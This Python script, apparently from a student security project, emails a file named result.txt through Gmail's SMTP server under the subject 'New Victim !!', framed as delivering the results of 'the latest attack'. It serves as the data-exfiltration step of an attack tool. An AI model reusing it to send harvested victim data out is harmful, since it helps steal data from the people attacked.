# import the required modules to manipulate emails
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import re

# color code
RED = "\033[1;31m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
BOLD = "\033[;1m"
GREEN = "\033[0;32m"
purple = '\033[35m'

regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'  # email validation


def check(email):
    # Checking if the entered email is valid
    if re.fullmatch(regex, email):
        return True
    else:
        return False


def send_emails(): # this function will (create email - connect to SMTP server - send email)
    smtp_port = 587  # Standard secure SMTP port
    smtp_server = "smtp.gmail.com"  # Google SMTP Server

    email_from = "######@###.com"  # Email to be added HERE, removed for security purpose
    pwd = "#######"  # API password to be added HERE, removed for security purpose

    print(CYAN, "\n-------------- Sending the attack details --------------------\n")
    email_to = input("Enter the recipient email: ")

    if check(email_to):  # send if the email is valid
        # email parts information
        email_subject = "New Victim !! "
        # create the body of the email
        body = """
            Hi,
            Below is the file containing all the information regarding the latest attack
            take a look at it !
            """
        message = MIMEMultipart() # create an object to capture different parts of the email
        message['From'] = email_from
        message['To'] = email_to
        message['Subject'] = email_subject

        message.attach(MIMEText(body, 'plain'))  # Attach the body of the message to the same object message

        filename = "result.txt"  # Define the file to attach
        attachment = open(filename, 'rb')
        # encode it as base 64
        attachment_package = MIMEBase('application', 'octet-stream')
        attachment_package.set_payload(attachment.read())
        encoders.encode_base64(attachment_package)  # Encode as base 64
        attachment_package.add_header('Content-Disposition', "attachment; filename= " + filename) # adding headers
        message.attach(attachment_package) # attaching it to the object

        text = message.as_string()  # Cast as string
        try:  # Connect to the server
            print(BLUE, "\nConnecting to the email server...")
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(email_from, pwd)
            print(BLUE, "   Successfully connected")
            print(GREEN)
            print("---------------------------------------------------------------")
            print(f"Sending email to: {email_to}...\n")
            server.sendmail(email_from, email_to, text) # sending the email
            print("   Email is sent successfully")
            # team info
            print(purple)
            print("---------------------------------------------------------------")
            print("\t\t\t~I hope you enjoyed with us!, Thank you.")
            print("---------------------------------------------------------------")
            print("\t\t\t\t~Team members:")
            print("Asma Alanazi \nLayan Musbah \nNouf Alzahrani \nShahad Alshalawi \nWaad Almulhim")
            print("---------------")
            print("~Supervised by:")
            print("Mr. Hussain Alattas")

        except Exception as ex:
            print(ex)
        finally:
            server.quit()  # Close the port
    else:  # in case the email is invalid it will not send
        print("invalid email, Try again")
        send_emails()
